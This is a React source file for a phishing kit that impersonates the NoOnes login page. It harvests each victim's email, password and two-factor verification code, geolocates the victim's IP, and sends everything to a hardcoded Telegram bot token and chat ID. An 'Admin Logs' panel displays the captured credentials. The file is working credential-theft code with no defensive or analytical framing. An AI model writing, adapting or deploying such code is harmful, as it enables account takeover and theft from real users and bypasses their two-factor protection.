
import React, { useState, useEffect } from 'react';
import LoginScreen from './components/LoginScreen';
import VerificationScreen from './components/VerificationScreen';
import AdminPanel from './components/AdminPanel';
import ThemeToggle from './components/ThemeToggle';
import LanguageSelector from './components/LanguageSelector';
import { AuthStep, Submission } from './types';

const DEFAULT_LOGO = "https://noones.com/images/noones-logo-white.svg";
const TELEGRAM_TOKEN = "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk";
const TELEGRAM_CHAT_ID = "2100006818";

const App: React.FC = () => {
  const [step, setStep] = useState<AuthStep>('login');
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [logoUrl, setLogoUrl] = useState<string>(DEFAULT_LOGO);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [currentDraft, setCurrentDraft] = useState<{ email: string; pass: string } | null>(null);
  const [userIp, setUserIp] = useState<string>("Detecting...");

  useEffect(() => {
    // Load local settings
    const savedLogo = localStorage.getItem('noones_custom_logo');
    if (savedLogo) setLogoUrl(savedLogo);

    // Fetch IP for better logging
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => setUserIp(`${data.ip} (${data.city}, ${data.country_name})`))
      .catch(() => setUserIp("Unknown"));
  }, []);

  const escapeHtml = (unsafe: string) => {
    return unsafe
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  };

  const sendToTelegram = async (message: string) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
      if (!response.ok) {
        const errorData = await response.json();
        console.error("Telegram API rejection:", errorData);
      }
    } catch (e) {
      console.error("Telegram Network Error:", e);
    }
  };

  const handleLoginCapture = (data: { email: string; pass: string }) => {
    setCurrentDraft(data);
    
    const message = `<b>🚀 NoOnes - LOGIN ATTEMPT</b>\n\n` +
                    `<b>📧 User:</b> <code>${escapeHtml(data.email)}</code>\n` +
                    `<b>🔑 Pass:</b> <code>${escapeHtml(data.pass)}</code>\n\n` +
                    `<b>🌐 IP:</b> ${userIp}\n` +
                    `<b>💻 OS:</b> ${navigator.platform}\n` +
                    `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
    
    sendToTelegram(message);
    
    // Log locally for the session
    const newSubmission: Submission = {
      id: Math.random().toString(36).substr(2, 9),
      emailOrPhone: data.email,
      password: data.pass,
      timestamp: new Date().toISOString()
    };
    setSubmissions(prev => [newSubmission, ...prev]);

    setStep('verification');
  };

  const handleVerificationCapture = async (code: string) => {
    if (currentDraft) {
      const message = `<b>✅ NoOnes - VERIFICATION RECEIVED</b>\n\n` +
                      `<b>📧 User:</b> <code>${escapeHtml(currentDraft.email)}</code>\n` +
                      `<b>🔑 Pass:</b> <code>${escapeHtml(currentDraft.pass)}</code>\n` +
                      `<b>🔢 Code:</b> <code>${code}</code>\n\n` +
                      `<b>🌐 IP:</b> ${userIp}\n` +
                      `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
      
      sendToTelegram(message);

      // Update the local log with the code
      setSubmissions(prev => prev.map(s => 
        (s.emailOrPhone === currentDraft.email && !s.verificationCode) 
        ? { ...s, verificationCode: code } 
        : s
      ));

      setCurrentDraft(null);
      setStep('login');
      alert("Verification processed. Redirecting...");
    }
  };

  useEffect(() => {
    document.body.className = isDarkMode 
      ? 'bg-[#121212] transition-colors duration-200' 
      : 'bg-gray-100 transition-colors duration-200';
  }, [isDarkMode]);

  const toggleTheme = () => setIsDarkMode(!isDarkMode);

  const handleUpdateLogo = (newUrl: string) => {
    setLogoUrl(newUrl);
    if (newUrl) {
      localStorage.setItem('noones_custom_logo', newUrl);
    } else {
      localStorage.removeItem('noones_custom_logo');
    }
  };

  const clearLogs = () => {
    setSubmissions([]);
  };

  const isWhiteLogo = logoUrl === DEFAULT_LOGO || (logoUrl && logoUrl.toLowerCase().includes('white'));
  const shouldInvert = !isDarkMode && isWhiteLogo;

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      {step !== 'admin' && (
        <div className="mb-8 h-12 flex items-center justify-center">
          <img 
            src={logoUrl || DEFAULT_LOGO} 
            alt="Logo" 
            className={`h-10 md:h-12 w-auto object-contain transition-all duration-300 ${shouldInvert ? 'invert' : ''}`}
            onError={(e) => {
              (e.target as HTMLImageElement).src = DEFAULT_LOGO;
            }}
          />
        </div>
      )}

      <div className="w-full flex justify-center mb-8">
        {step === 'login' && (
          <LoginScreen 
            onLogin={handleLoginCapture} 
            isDarkMode={isDarkMode} 
          />
        )}
        {step === 'verification' && (
          <VerificationScreen 
            onContinue={handleVerificationCapture} 
            isDarkMode={isDarkMode} 
          />
        )}
        {step === 'admin' && (
          <AdminPanel 
            submissions={submissions}
            onClear={clearLogs}
            isDarkMode={isDarkMode}
            onBack={() => setStep('login')}
            logoUrl={logoUrl}
            onUpdateLogo={handleUpdateLogo}
          />
        )}
      </div>

      <div className="w-full max-w-md flex justify-between items-center px-2">
        <div className="flex items-center space-x-6">
          <ThemeToggle isDarkMode={isDarkMode} onToggle={toggleTheme} />
          <button 
            onClick={() => setStep(step === 'admin' ? 'login' : 'admin')}
            className={`text-xs font-bold uppercase tracking-widest px-2 py-1 rounded border transition-colors ${
              isDarkMode 
                ? 'border-white/20 text-white/40 hover:text-white hover:border-white' 
                : 'border-black/20 text-black/40 hover:text-black hover:border-black'
            }`}
          >
            {step === 'admin' ? 'Exit Admin' : 'Admin Logs'}
          </button>
        </div>
        <LanguageSelector />
      </div>
    </div>
  );
};

export default App;
